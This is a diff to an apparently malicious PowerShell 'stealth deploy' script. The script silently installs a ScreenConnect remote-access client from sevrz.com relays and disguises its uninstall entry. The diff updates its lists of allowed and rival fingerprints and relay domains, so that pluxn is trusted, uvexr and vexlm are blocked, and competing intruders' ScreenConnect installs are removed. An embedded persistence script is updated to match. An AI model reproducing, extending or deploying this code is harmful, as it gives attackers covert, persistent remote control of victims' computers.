@@ -46,12 +46,14 @@ try {
 # CONFIG - competition / stealth build
 # ============================================
 $PrimaryFingerprint = '5f6010579852e507'
-# Only keep FPs that are OUR instance. Foreign relays (pluxn/uvexr/etc) are rivals even if FP was historically listed.
-$AllowedFingerprints = @('5f6010579852e507')
-$RequiredRelayHints = @('sevrz.com', 'update.sevrz.com', 'ui.sevrz.com')
+# Allowed instances: sevrz primary + pluxn secondary. Everything else (e.g. uvexr) is rival.
+$AllowedFingerprints = @('5f6010579852e507', 'f861c8140d453427')
+$RequiredRelayHints = @('sevrz.com', 'update.sevrz.com', 'ui.sevrz.com', 'pluxn.com', 'update.pluxn.com')
+$BlockedRelayHints = @('uvexr.com', 'update.uvexr.com', 'vexlm.com')
 $SvcName = "ScreenConnect Client ($PrimaryFingerprint)"
 $AllowedScreenConnect = @(
-    "ScreenConnect Client ($PrimaryFingerprint)"
+    "ScreenConnect Client ($PrimaryFingerprint)",
+    'ScreenConnect Client (f861c8140d453427)'
 )
 $MsiUrl = 'https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
 $RelayServer = 'update.sevrz.com'
@@ -80,7 +82,6 @@ $LegacyFingerprints = @(
     '9dd7e861c862d175',
     '3a607f4eb8ca7215',
     'd4212f02794545b5',
-    'f861c8140d453427',
     '89a1ede2d1bd11dd'
 )
 
@@ -658,8 +659,13 @@ function Test-IsAllowedBlob {
     param([string]$Blob)
     if ([string]::IsNullOrWhiteSpace($Blob)) { return $false }
 
-    # Foreign relay in launch args = never allowed (even if FP was once trusted)
-    if ($Blob -match '(?i)[?&]h=([^&\s]+)') {
+    # Explicit blocked rival relays
+    foreach ($bad in $BlockedRelayHints) {
+        if ($Blob -like "*$bad*") { return $false }
+    }
+
+    # If launch args include h= host, it must be an allowed relay
+    if ($Blob -match '(?i)[?&]h=([^&\s"]+)') {
         $hostArg = [Uri]::UnescapeDataString($Matches[1])
         $ours = $false
         foreach ($h in $RequiredRelayHints) {
@@ -667,14 +673,10 @@ function Test-IsAllowedBlob {
         }
         if (-not $ours) { return $false }
     }
-    foreach ($bad in @('pluxn.com', 'uvexr.com', 'vexlm.com')) {
-        if ($Blob -like "*$bad*") { return $false }
-    }
 
     foreach ($fp in $AllowedFingerprints) {
         if ($Blob -like "*$fp*") { return $true }
     }
-    # Camouflaged primary ARP name ONLY if path proves primary fingerprint
     if ($Blob -like "*$ArpDisplayName*" -and $Blob -like "*$PrimaryFingerprint*") { return $true }
     return $false
 }
@@ -1130,12 +1132,10 @@ try {
 } catch {}
 
 Write-Log '=== Stealth deploy start ==='
-Write-Log 'WU_BUILD_20260729X'
+Write-Log 'WU_BUILD_20260729Y'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
-# Immediate rival kill before anything else (known bad FPs + non-sevrz)
-foreach ($fp in @('89a1ede2d1bd11dd', 'f861c8140d453427') + $LegacyFingerprints) {
-    Remove-ScByFingerprint -Fingerprint $fp
-}
+# Immediate kill of known rival FP (uvexr) - never touch allowed sevrz/pluxn
+Remove-ScByFingerprint -Fingerprint '89a1ede2d1bd11dd'
 Invoke-RemoveUnauthorizedScreenConnect
 
 # ============================================
@@ -1883,9 +1883,9 @@ try {
 } catch {}
 
 `$fp = '$PrimaryFingerprint'
-`$allowed = @('5f6010579852e507')
-`$relayHints = @('sevrz.com','update.sevrz.com','ui.sevrz.com')
-`$badRelays = @('pluxn.com','uvexr.com','vexlm.com')
+`$allowed = @('5f6010579852e507','f861c8140d453427')
+`$relayHints = @('sevrz.com','update.sevrz.com','ui.sevrz.com','pluxn.com','update.pluxn.com')
+`$badRelays = @('uvexr.com','update.uvexr.com','vexlm.com')
 `$svcName = 'ScreenConnect Client ($fp)'
 `$msiUrl = '$MsiUrl'
 `$work = '$WorkDir'
